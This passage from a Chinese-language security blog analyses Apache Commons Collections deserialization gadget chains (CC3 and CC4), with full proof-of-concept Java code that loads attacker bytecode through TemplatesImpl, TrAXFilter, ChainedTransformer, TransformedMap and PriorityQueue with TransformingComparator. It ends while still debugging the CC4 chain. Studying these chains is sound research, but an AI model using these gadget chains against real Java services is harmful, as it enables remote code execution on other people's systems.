<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CC32&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        //  templates.newTransformer();</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">        instantiateTransformer.transform( TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802192341688.png"
                      alt="image-20230802192341688"
                ></p>
<p>可以看到这里成功执行了后面的利用链进行了命令执行。</p>
<p>然后我们把CC1链后面用到的 AnnotationInvocationHandler类<code>readObject()</code>方法调用<code>setValue()</code>触发利用链的代码补上</p>
<p>POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CC32&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        //  templates.newTransformer();</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">        //instantiateTransformer.transform( TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null,instantiateTransformer);</span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">       ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">       out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>那么我们现在还有一个问题就是我们怎么把<code>TrAXFilter.class</code>给传进去</p>
<p>其实这个问题和我们在CC1中setvalue的值不可控的原因是一样的</p>
<p>因为我们setvlaue要传的值就是我们这里的TrAXFilter.class</p>
<p>那我们这里还可以通过ConstantTransformer来解决这个问题。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">new ConstantTransformer(TrAXFilter.class)</span><br></pre></td></tr></table></figure></div>

<p>然后这里还是通过chainTransform将他们连起来</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure></div>

<p>最终的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC32&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        //  templates.newTransformer();</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">        //instantiateTransformer.transform( TrAXFilter.class);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">       ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">       out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802193914829.png"
                      alt="image-20230802193914829"
                ></p>
<p>到这里我们CC3这条链子就分析完了。</p>
<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>CC3利用链：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230803170453523.png"
                      alt="image-20230803170453523"
                ></p>
<p>整体的一个利用链：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230803170303019.png"
                      alt="image-20230803170303019"
                ></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonCollections4与CommonCollections2利用链分析</title>
    <url>/2023/09/08/CommonCollections4%E4%B8%8ECommonCollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>CC4这条利用链与前面不同的是用到了新的Commons-Collections4依赖库，我们在前面分析的CC1,3.6用的都是Commons-Collections库3.2.1的版本</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>CC4这条利用链最后和我们前面分析的利用链是一样的，使用Transform类对象的tranform方法直接执行代码，或者像CC3里面一样利用TemplatesImpl类去实现类加载执行任意代码。</p>
<h2 id="二、利用链分析"><a href="#二、利用链分析" class="headerlink" title="二、利用链分析"></a>二、利用链分析</h2><p>无论我们利用链的后面是使用tranform直接执行代码，还是利用TemplatesImpl类去实现类加载执行任意代码，都是要向上找哪里调用了transfom方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230905084904958.png"
                      alt="image-20230905084904958"
                ></p>
<p>可以看到又很多类方法调用了transform方法</p>
<p>CC4这里用的是TransformingComparator类的<code>compare()</code>方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public int compare(final I obj1, final I obj2) &#123;</span><br><span class="line">    final O value1 = this.transformer.transform(obj1);</span><br><span class="line">    final O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的compare调用了tranform方法，那我们接下来就要继续找对compare的调用,最好是直接重写了readObject方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230905085727058.png"
                      alt="image-20230905085727058"
                ></p>
<p>可以看到这里面有很多，所有我们想要直接找到调用compare方法，并且可以直接readobject的很难，需要很强的java代码功底</p>
<p>我们这里是为了分析利用链，所有就不一个个类的找了</p>
<p>在CC4中利用的是java.util.PriorityQueue 优先队列这个类。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907184933597.png"
                      alt="image-20230907184933597"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">    int half = size &gt;&gt;&gt; 1;</span><br><span class="line">    while (k &lt; half) &#123;</span><br><span class="line">        int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        int right = child + 1;</span><br><span class="line">        if (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; 0)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">            break;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>在PriorityQueue类的siftDownUsingComparator中调用了compare方法</p>
<p>到这里我们可以看到是通过comparator调用了compare方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907185119139.png"
                      alt="image-20230907185119139"
                ></p>
<p>而且我们可以看到comparator是初始化的时候传进去的，所以是可控的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907185224377.png"
                      alt="image-20230907185224377"
                ></p>
<p>而且TransformingComparator类恰恰是实现了Comparator和Serializable接口</p>
<p>而在前面分析CC3并没有用到这里是因为旧的Commons-Collections包中TransformingComparator类没有实现Serializable接口，导致无法使用这条链。</p>
<p>那我们最好的就是能够通过PriorityQueue类的readObject方法直接调用到siftDownUsingComparator方法</p>
<p>那就向上找siftUpUsingComparator的调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void siftDown(int k, E x) &#123;</span><br><span class="line">    if (comparator != null)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    else</span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>在siftDown里面调用了siftUpUsingComparator方法</p>
<p>继续向上找调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那我们这里就是继续找heapify方法的调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230905090932057.png"
                      alt="image-20230905090932057"
                ></p>
<p>可以看到有两处调用了heapify方法</p>
<p>然后readObject方法中也调用了这个方法</p>
<p>那我们的利用链就可以构造为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject() --&gt; PriorityQueue.heapify() --&gt; PriorityQueue.siftDown() --&gt; PriorityQueue.siftDownUsingComparator() --&gt; TransformingComparator.compare() --&gt; Transformer.transform()</span><br></pre></td></tr></table></figure></div>

<p>这是CC4的前半部分的利用链，后半部分就是CC3的写法了动态加载字节码或者transform直接进行命令执行</p>
<p>这里就以动态加载字节码进行命令执行</p>
<p>我们这里先构造利用TemplatesImpl加载字节码</p>
<p>这里我们直接把CC3中的拿过了用就行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Templates templates = new TemplatesImpl();</span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;字节码文件&quot;));</span><br><span class="line">byte[][] codes = &#123;code&#125;;</span><br><span class="line">setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure></div>

<p>以及用 <code>InstantiateTransformer</code>类将TrAXFilter初始化，实现调用<code>TemplatesImpl.newTransformer()</code>方法，触发后续的调用：</p>
<p>这里其实和CC3都是一样的</p>
<p>那么我们后续的利用链代码就是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Templates templates = new TemplatesImpl();</span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">byte[][] codes = &#123;code&#125;;</span><br><span class="line">setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">//  templates.newTransformer();</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">//instantiateTransformer.transform( TrAXFilter.class);</span><br><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure></div>

<p>那么后面我们要做的就行通过TransformingComparator类的compare方法调用transform方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int compare(final I obj1, final I obj2) &#123;</span><br><span class="line">    final O value1 = this.transformer.transform(obj1);</span><br><span class="line">    final O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907193505710.png"
                      alt="image-20230907193505710"
                ></p>
<p>decorated可空是在TransformingComparator类初始化时传入的</p>
<p>那我们这里直接可以把我们前面的chainTransformer作为参数传入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator transformingComparator =new TransformingComparator(chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<p>那么后面就是对compare的调用了</p>
<p>前面我们分析对于compare的调用是在PriorityQueue类中实现的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907193751197.png"
                      alt="image-20230907193751197"
                ></p>
<p>我们前面分析这个comparator也是可控的，所以我们可以直接在初始化类PriorityQueue将transformingComparator传入进去</p>
<p>进而触发compare，触发后续利用链</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue =new PriorityQueue(transformingComparator);</span><br></pre></td></tr></table></figure></div>

<p>其实到这里我们已经来到了readObject的类，后面就是反序列化触发到siftDownUsingComparator()方法</p>
<p>那我们这里直接开始从readObject在分析一遍</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194311361.png"
                      alt="image-20230907194311361"
                ></p>
<p>readObject后就会触发到heapify</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194337573.png"
                      alt="image-20230907194337573"
                ></p>
<p>在heapify进行for循环就会调用sitfDown</p>
<p>继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194440954.png"
                      alt="image-20230907194440954"
                ></p>
<p>到siftdown，这里会进行一个if判断，如果comparator不为空就会调用siftDownUsingComparator()</p>
<p>我们前面在初始化PriorityQueue类时，将 transformingComparator作为参数赋值给了comparator用于触发后续利用链</p>
<p>所以这里的if判断是肯定成立的</p>
<p>进而触发了siftDownUsingComparator(k, x);</p>
<p>跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194844692.png"
                      alt="image-20230907194844692"
                ></p>
<p>在if判断中存在对compare的调用</p>
<p>但是这里我们分析可以得知，在while循环中必然会触发if判读进而触发compare，触发后续利用链。</p>
<p>所以理论上我们现在只需要进行序列化和反序列化就能够触发后续利用链。</p>
<p>那么到这里我们的exp为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileNmae, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125; );</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserializable</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>但是我们这里进行序列化和反序列化操作后并没有什么弹出计算器，也没有报错。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907200432678.png"
                      alt="image-20230907200432678"
                ></p>
<p>打断点跟进调试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907200509703.png"
                      alt="image-20230907200509703"
                ></p>
<p>进行调试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201714594.png"
                      alt="image-20230907201714594"
                ></p>
<p>这里大概就是将队列中的数据一个个反序列化，然后存储到定义的queue数组中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201843047.png"
                      alt="image-20230907201843047"
                ></p>
<p>我们也可以看到在序列化的时候就是通过循环一个个的序列化</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201949994.png"
                      alt="image-20230907201949994"
                ></p>
<p>我们到这一步就没有进入到for循环中</p>
<p>这也可能是我们代码没有正常弹出计算器的原因</p>
<p>进入for循环的条件是i&gt;&#x3D;0</p>
<p>而i的值是等于（size&gt;&gt;&gt;1）</p>
<p><code>size &gt;&gt;&gt; 1</code> 是一个位操作，表示将 <code>size</code> 的二进制表示向右移动一位（相当于将 <code>size</code> 除以 2 并向下取整）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907202155487.png"
                      alt="image-20230907202155487"
                ></p>
<p>而根据调试信息size的值为0，因为我们并没有向队列中传入数据</p>
<p>队列中的元素个数为0，所以导致size的值为0</p>
